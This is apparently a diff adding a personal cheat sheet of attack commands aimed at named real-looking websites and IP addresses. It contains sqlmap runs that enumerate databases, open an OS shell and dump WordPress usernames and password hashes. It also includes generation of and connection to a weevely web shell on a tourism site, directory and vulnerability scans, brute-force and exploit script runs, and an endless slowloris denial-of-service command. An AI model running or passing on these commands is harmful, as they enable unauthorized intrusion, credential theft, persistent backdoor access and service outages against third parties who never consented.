@@ -1,0 +1,50 @@
+nikto -h http://morelli.co.id 
+http://morelli.co.id/wp-login.php
+
+sqlmap -u “http://www.gujarattourism.com/tourist_guide/related?d=1”--dbs --level=3 --risk=3
+sqlmap -u “http://www.gujarattourism.com/tourist_guide/related?d=1” -D [DATABASE NAME]--os-shell
+sqlmap -u "http://morelli.co.id/wp-login.php?redirect_to=http%3A%2F%2Fmorelli.co.id%2Fwp-admin%2F&reauth=1" -D wordpress -T wp_users -C user_firstname,user_lastname,user_nickname,user_pass --dump 
+dirb http://morelli.co.id /usr/share/dirb/wordlisl/vulns/apache.txt
+weevely generate rooT /root/Desktop/sys.php
+weevely http://www.gujarattourism.com/sys.php rooT
+
+cd /usr/share/nmap/scripl/
+git clone https://github.com/vulnersCom/nmap-vulners.git
+git clone https://github.com/scipag/vulscan.git
+ls vulscan/*.csv
+cd vulscan/utilities/updater/
+chmod +x updateFiles.sh
+./updateFiles.sh
+
+dirb http://103.77.78.230
+nikto -h http://103.77.78.230
+nikto -host www.binarytides.com -useproxy http://localhost:8080/
+
+nmap -sS -A -T (Ip/24)
+nmap -sS -T (Ip/24)
+nmap -sS (Ip/24)
+nmap -sn 10.0.0.1/24
+nmap -sT -sV -A -O -v -p 1-65535 10.0.0.99
+
+locate *.nse
+locate *vuln*.nse
+
+nmap --script <scriptname> 103.77.78.230
+nmap --script smb-check-vulns-nse 103.77.78.230
+nmap --script http-vuln-cve2013-0156.nse 103.77.78.230
+nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p445 103.77.78.230
+nmap -Pn --script vuln http://morelli.co.id/wp-login.php
+nmap -sV --script http-wordpress-enum 139.99.172.99
+nmap --script nmap-vulners -sV 139.99.172.99
+nmap --script vulscan -sV 103.77.78.230
+nmap --script vulscan --script-args vulscandb=database_name -sV 103.77.78.230
+nmap --script vulscan --script-args vulscandb=scipvuldb.csv -sV 103.77.78.230
+nmap --script vulscan --script-args vulscandb=exploitdb.csv -sV 103.77.78.230
+nmap --script vulscan --script-args vulscandb=securitytracker.csv -sV 103.77.78.230
+nmap --script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -sV 103.77.78.230
+nmap --script http-wordpress-enum --script-args type="themes" 139.99.172.99
+nmap --script http-wordpress-enum --script-args check-latest=true,search-limit=10 139.99.172.99
+nmap --script exploit -Pn 
+nmap --script brute -Pn
+nmap --script dos -Pn
+nmap --max-parallelism 750 -Pn --script http-slowloris --script-args http-slowloris.runforever=true
